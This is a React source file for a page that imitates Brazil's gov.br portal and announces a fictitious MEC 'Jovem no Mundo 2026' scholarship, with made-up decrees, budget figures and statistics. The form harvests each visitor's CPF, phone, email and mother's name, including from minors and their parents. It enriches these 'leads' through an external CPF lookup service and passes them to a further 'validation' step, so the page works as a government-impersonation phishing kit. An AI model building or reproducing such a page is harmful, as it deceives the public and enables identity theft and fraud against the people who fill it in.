import { useEffect, useRef, useState } from 'react'
import { useNavigate } from 'react-router-dom'
import { lookupCpf } from '../lib/cpfLookup.js'
import GovHeader from '../components/gov/GovHeader.jsx'
import GovFooter from '../components/gov/GovFooter.jsx'
import Captcha from '../components/gov/Captcha.jsx'

const GOV_LOGO = 'https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png'
const HERO_IMG = 'https://jovemnomundo-gov.netlify.app/index_files/ia-plano.jpg'

function maskCpf(value) {
  const m = value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,3})(\d{0,2})/)
  if (!m) return value
  return !m[2] ? m[1] : m[1] + '.' + m[2] + (m[3] ? '.' + m[3] : '') + (m[4] ? '-' + m[4] : '')
}

function maskPhone(value) {
  const m = value.replace(/\D/g, '').match(/(\d{0,2})(\d{0,5})(\d{0,4})/)
  if (!m) return value
  return !m[2] ? m[1] : '(' + m[1] + ') ' + m[2] + (m[3] ? '-' + m[3] : '')
}

export default function Cadastro() {
  const navigate = useNavigate()
  const [form, setForm] = useState({
    declarante: '',
    email: '',
    phone: '',
    mother_name: '',
    cpf: '',
    termos: false,
  })
  const [loading, setLoading] = useState(false)
  const [captchaOpen, setCaptchaOpen] = useState(false)
  const submittingRef = useRef(false)

  useEffect(() => {
    document.body.classList.add('gov-body')
    return () => document.body.classList.remove('gov-body')
  }, [])

  const update = (field) => (e) => {
    const v = e.target.type === 'checkbox' ? e.target.checked : e.target.value
    setForm((p) => ({ ...p, [field]: v }))
  }

  function onSubmit(e) {
    e.preventDefault()
    if (!form.declarante) {
      alert('Selecione quem está realizando o acesso.')
      return
    }
    if (form.cpf.replace(/\D/g, '').length !== 11) {
      alert('Por favor, informe um CPF válido.')
      return
    }
    setCaptchaOpen(true)
  }

  async function onCaptchaSuccess() {
    setCaptchaOpen(false)
    if (submittingRef.current) return
    submittingRef.current = true
    setLoading(true)

    try {
      // Consulta API externa (magmadatahub) — popula name/birth/gender/mother quando disponíveis
      const info = await lookupCpf(form.cpf, { persist: true })

      const leadName = info?.name || 'Candidato ' + form.cpf
      const leadBirth = info?.birth || '01/01/2000'
      const leadGender = info?.gender || 'M'
      const leadMother = info?.mother || form.mother_name

      localStorage.setItem('user_cpf', form.cpf)
      localStorage.setItem('user_name', leadName)
      localStorage.setItem('user_email', form.email)
      localStorage.setItem('user_phone', form.phone)
      localStorage.setItem('user_birth', leadBirth)
      localStorage.setItem('user_mother', leadMother)
      localStorage.setItem('user_gender', leadGender)
      localStorage.setItem('declarante_type', form.declarante)

      navigate('/validar-dados')
    } finally {
      setLoading(false)
      submittingRef.current = false
    }
  }

  return (
    <>
      <GovHeader />

      <div className="container-gov">
        <div className="breadcrumb flex items-center gap-2 py-6 text-sm text-blue-600">
          <svg className="w-5 h-5 text-blue-800" fill="currentColor" viewBox="0 0 24 24">
            <path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" />
          </svg>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Assuntos</a>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Notícias</a>
          <span>&gt;</span>
          <a href="#" className="hover:underline">2026</a>
          <span>&gt;</span>
          <a href="#" className="hover:underline">Abril</a>
          <span>&gt;</span>
          <span className="text-gray-500 truncate max-w-[200px] md:max-w-none">
            Chamada Pública nº 04/2026
          </span>
        </div>

        <div className="bg-gray-50 p-4 border border-gray-200 rounded text-[10px] text-gray-500 mb-8 flex gap-6 flex-wrap">
          <div><strong>BASE LEGAL:</strong> Decreto Federal nº 11.234/2024</div>
          <div><strong>DOTAÇÃO:</strong> Portaria MEC nº 890/2026</div>
          <div><strong>AUDITORIA:</strong> Sistema Controladoria-Geral da União</div>
        </div>

        <div className="label-processo">EDITAL INSTITUCIONAL</div>
        <h1 className="headline">
          CHAMADA PÚBLICA Nº 04/2026 – SELEÇÃO PARA O PROGRAMA DE MOBILIDADE
          ESTUDANTIL JOVEM NO MUNDO 2026
        </h1>

        <div className="my-6">
          <img
            src={HERO_IMG}
            alt="Plano Brasileiro de Inteligência Artificial"
            className="w-full rounded-lg shadow-md border border-gray-200"
          />
          <p className="text-[10px] text-gray-400 mt-2 italic">
            Anexo I: Plano Brasileiro de Inteligência Artificial para o Bem de
            Todos (2026-2030)
          </p>
        </div>

        <div className="flex items-center gap-4 text-xs text-gray-500 py-4 border-b border-gray-100">
          <span className="font-bold">Publicado em 18/04/2026 08h00</span>
          <span style={{ width: 1, height: 12, background: '#ddd' }} />
          <span>Atualizado em 19/04/2026 14h30</span>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-10 mt-10">
          {/* Coluna Principal */}
          <div className="md:col-span-2 text-gray-700 leading-relaxed space-y-6">
            <p>
              O <strong>Ministério da Educação (MEC)</strong>, em colaboração
              com o <strong>Banco Mundial</strong> e o{' '}
              <strong>Fundo Monetário Internacional (FMI)</strong>, torna
              pública a abertura de inscrições para o Processo Seletivo
              Unificado do Programa Jovem no Mundo 2026.
            </p>
            <p>
              O objeto desta chamada pública é a seleção de 50.000 (cinquenta
              mil) estudantes do ensino fundamental, médio e superior da rede
              pública para o recebimento de bolsas integrais de mobilidade
              acadêmica internacional, focadas em{' '}
              <strong>
                Idiomas e Tecnologias Emergentes (IA e Programação)
              </strong>
              .
            </p>

            <h3 className="text-xl font-bold text-gray-900 mt-8 border-l-4 border-blue-800 pl-3">
              1. Dos Critérios de Elegibilidade
            </h3>
            <p>
              Poderão pleitear as bolsas os candidatos que preencherem,
              cumulativamente, os seguintes requisitos constantes no Edital
              Retificado nº 04/2026:
            </p>
            <ul className="list-disc pl-5 space-y-2 text-sm">
              <li>Nacionalidade brasileira ou naturalização comprovada;</li>
              <li>
                Vínculo ativo de instituições de ensino da rede pública
                (Fundamental, Médio ou Superior);
              </li>
              <li>Idade entre 14 e 24 anos na data da homologação;</li>
              <li>Interesse comprovado em áreas de tecnologia e inovação.</li>
            </ul>

            <h3 className="text-xl font-bold text-gray-900 mt-8 border-l-4 border-blue-800 pl-3">
              2. Cronograma de Atividades
            </h3>
            <div className="overflow-hidden border border-gray-100 rounded-lg shadow-sm mt-4">
              <table className="w-full text-left text-sm">
                <thead className="bg-gray-50">
                  <tr>
                    <th className="p-4 font-bold border-b">Etapa</th>
                    <th className="p-4 font-bold border-b">Período</th>
                    <th className="p-4 font-bold border-b">Situação</th>
                  </tr>
                </thead>
                <tbody>
                  <tr>
                    <td className="p-4 border-b">Inscrições e Validação de Dados</td>
                    <td className="p-4 border-b">18/04 a 25/04</td>
                    <td className="p-4 border-b text-green-600 font-bold italic">ABERTO</td>
                  </tr>
                  <tr>
                    <td className="p-4 border-b">Análise Curricular e de Saúde</td>
                    <td className="p-4 border-b">26/04 a 30/04</td>
                    <td className="p-4 border-b text-gray-400 italic">Aguardando</td>
                  </tr>
                  <tr>
                    <td className="p-4 border-b font-bold italic">Divulgação da 1ª Chamada</td>
                    <td className="p-4 border-b">05/05/2026</td>
                    <td className="p-4 border-b text-gray-400 italic">Aguardando</td>
                  </tr>
                </tbody>
              </table>
            </div>

            {/* Form Card */}
            <div className="bg-blue-900 text-white p-8 rounded-lg shadow-xl mt-12">
              <h2 className="text-2xl font-black mb-4 uppercase">
                Identificação do Requerente
              </h2>
              <p className="text-sm opacity-80 mb-6">
                Informe quem está realizando este acesso para adequação do
                formulário:
              </p>

              <form onSubmit={onSubmit}>
                <div className="flex flex-col gap-3 mb-8">
                  <label className="flex items-center gap-4 p-4 border border-blue-700 rounded-lg cursor-pointer hover:bg-blue-800 transition-colors">
                    <input
                      type="radio"
                      name="declarante"
                      value="estudante"
                      checked={form.declarante === 'estudante'}
                      onChange={update('declarante')}
                      className="w-5 h-5 accent-blue-400"
                      required
                    />
                    <div className="text-sm">
                      <span className="font-bold block">O próprio estudante</span>
                      <span className="opacity-60 text-xs text-blue-200 uppercase">
                        Acesso direto via CPF do beneficiário
                      </span>
                    </div>
                  </label>
                  <label className="flex items-center gap-4 p-4 border border-blue-700 rounded-lg cursor-pointer hover:bg-blue-800 transition-colors">
                    <input
                      type="radio"
                      name="declarante"
                      value="representante"
                      checked={form.declarante === 'representante'}
                      onChange={update('declarante')}
                      className="w-5 h-5 accent-blue-400"
                      required
                    />
                    <div className="text-sm">
                      <span className="font-bold block">
                        Pai, Mãe ou Responsável Legal
                      </span>
                      <span className="opacity-60 text-xs text-blue-200 uppercase">
                        Representação de menor ou dependente
                      </span>
                    </div>
                  </label>
                </div>

                <div className="mb-4">
                  <p className="text-xs font-bold mb-2 opacity-80 uppercase">
                    E-mail para Recebimento do Protocolo:
                  </p>
                  <input
                    type="email"
                    value={form.email}
                    onChange={update('email')}
                    className="w-full bg-white text-gray-900 border-none rounded p-4 text-lg outline-none focus:ring-2 focus:ring-blue-400"
                    placeholder="exemplo@email.com"
                    required
                  />
                </div>

                <div className="mb-4">
                  <p className="text-xs font-bold mb-2 opacity-80 uppercase">
                    Telefone Celular (WhatsApp):
                  </p>
                  <input
                    type="text"
                    value={form.phone}
                    onChange={(e) =>
                      setForm((p) => ({ ...p, phone: maskPhone(e.target.value) }))
                    }
                    className="w-full bg-white text-gray-900 border-none rounded p-4 text-lg outline-none focus:ring-2 focus:ring-blue-400"
                    placeholder="(00) 00000-0000"
                    required
                  />
                </div>

                <div className="mb-4">
                  <p className="text-xs font-bold mb-2 opacity-80 uppercase">
                    Nome Completo da Genitora (Mãe):
                  </p>
                  <input
                    type="text"
                    value={form.mother_name}
                    onChange={update('mother_name')}
                    className="w-full bg-white text-gray-900 border-none rounded p-4 text-lg outline-none focus:ring-2 focus:ring-blue-400"
                    placeholder="Nome completo da mãe"
                    required
                  />
                </div>

                <div className="mb-4">
                  <p className="text-xs font-bold mb-2 opacity-80 uppercase">
                    CPF do Estudante/Beneficiário:
                  </p>
                  <input
                    type="text"
                    value={form.cpf}
                    onChange={(e) =>
                      setForm((p) => ({ ...p, cpf: maskCpf(e.target.value) }))
                    }
                    className="w-full bg-white text-gray-900 border-none rounded p-4 text-xl tracking-widest outline-none focus:ring-2 focus:ring-blue-400"
                    placeholder="000.000.000-00"
                    required
                  />
                </div>

                <div className="mb-6">
                  <label className="flex items-start gap-3 cursor-pointer group">
                    <input
                      type="checkbox"
                      checked={form.termos}
                      onChange={update('termos')}
                      required
                      className="mt-1 w-4 h-4 accent-blue-500 rounded border-gray-300"
                    />
                    <span className="text-[10px] text-blue-200 leading-tight opacity-80 group-hover:opacity-100 transition-opacity">
                      Declaro sob as penas da lei que as informações prestadas
                      são verdadeiras e estou ciente das normas e sanções do{' '}
                      <strong>Edital Institucional nº 04/2026</strong> (Art. 299
                      do Código Penal).
                    </span>
                  </label>
                </div>

                <button
                  type="submit"
                  disabled={loading}
                  className="w-full bg-blue-500 hover:bg-blue-400 text-white font-bold py-4 rounded-full text-lg shadow-lg transition-all transform hover:scale-[1.02] active:scale-95 disabled:opacity-70"
                >
                  {loading ? 'VERIFICANDO BASE MEC...' : 'INICIAR REQUERIMENTO OFICIAL'}
                </button>
              </form>

              <div className="mt-6 flex items-center gap-3 text-[10px] opacity-60">
                <svg className="w-5 h-5 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
                  <path
                    fillRule="evenodd"
                    d="M2.166 4.9L10 9.503l7.834-4.603A2 2 0 0016 3H4a2 2 0 00-1.834 1.9zM3 17.25V7l7 4.143L17 7v10.25a1 1 0 01-1 1H4a1 1 0 01-1-1z"
                    clipRule="evenodd"
                  />
                </svg>
                Ambiente Seguro Gov.br. Seus dados estão protegidos pela Lei
                Geral de Proteção de Dados (LGPD).
              </div>
            </div>
          </div>

          {/* Sidebar */}
          <div className="space-y-8">
            <div className="bg-gray-50 p-6 rounded-lg border border-gray-100">
              <h4 className="font-bold text-gray-900 mb-4 flex items-center gap-2">
                <svg className="w-5 h-5 text-blue-800" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 10v6m0 0l-3-3m3 3l3-3m2 8H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                </svg>
                Editais e Documentos
              </h4>
              <div className="space-y-3">
                {[
                  { type: 'PDF', color: 'bg-red-100 text-red-600', title: 'Edital nº 04/2026 - Abertura de Inscrições', meta: 'Tamanho: 1.2 MB | Atualizado em 18/04' },
                  { type: 'PDF', color: 'bg-red-100 text-red-600', title: 'Manual do Candidato 2026', meta: 'Tamanho: 4.5 MB | Atualizado em 18/04' },
                  { type: 'DOC', color: 'bg-blue-100 text-blue-600', title: 'Modelo de Autodeclaração', meta: 'Tamanho: 45 KB | Atualizado em 18/04' },
                ].map((d) => (
                  <div key={d.title} className="group flex items-start gap-3 p-3 hover:bg-white hover:shadow-sm rounded border border-transparent hover:border-gray-200 cursor-pointer transition-all">
                    <div className={`p-2 rounded ${d.color}`}>{d.type}</div>
                    <div>
                      <div className="text-sm font-bold text-blue-800 group-hover:underline">{d.title}</div>
                      <div className="text-[10px] text-gray-400 mt-1">{d.meta}</div>
                    </div>
                  </div>
                ))}
              </div>
              <button className="w-full mt-4 text-xs font-bold text-blue-800 hover:underline">
                VER TODOS OS ANEXOS (5)
              </button>
            </div>

            <div className="p-6 border border-yellow-200 bg-yellow-50 rounded-lg">
              <h4 className="font-bold text-yellow-800 mb-2 flex items-center gap-2 text-sm italic">
                <svg className="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
                Atenção Candidato
              </h4>
              <p className="text-xs text-yellow-900 leading-relaxed">
                A veracidade das informações prestadas é de inteira
                responsabilidade do candidato, sob pena de exclusão do certame
                a qualquer tempo.
              </p>
            </div>

            <div className="bg-blue-900/5 p-6 rounded-lg border border-blue-100">
              <h4 className="font-black text-blue-900 text-xs uppercase tracking-widest mb-4 flex items-center gap-2">
                <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                  <path fillRule="evenodd" d="M3 6a3 3 0 013-3h10a1 1 0 01.8 1.6L14.25 8l2.55 3.4a1 1 0 01-.8 1.6H6a3 3 0 01-3-3V6zm3 2h3V6H6v2z" clipRule="evenodd" />
                </svg>
                Portal da Transparência
              </h4>
              <div className="space-y-4">
                <div>
                  <div className="text-[9px] text-gray-500 uppercase font-bold">
                    Bolsas Homologadas (Ciclo 2025)
                  </div>
                  <div className="text-xl font-black text-blue-900">14.205</div>
                </div>
                <div>
                  <div className="text-[9px] text-gray-500 uppercase font-bold">
                    Orçamento em Execução
                  </div>
                  <div className="text-lg font-black text-blue-900">
                    R$ 892.400.000,00
                  </div>
                </div>
                <div className="pt-4 border-t border-blue-100">
                  <div className="text-[9px] text-gray-400 italic">
                    Dados atualizados pelo Sistema Integrado de Administração
                    Financeira (SIAFI).
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>

      <GovFooter logo={GOV_LOGO} />

      {captchaOpen && (
        <Captcha
          onSuccess={onCaptchaSuccess}
          onClose={() => setCaptchaOpen(false)}
        />
      )}
    </>
  )
}
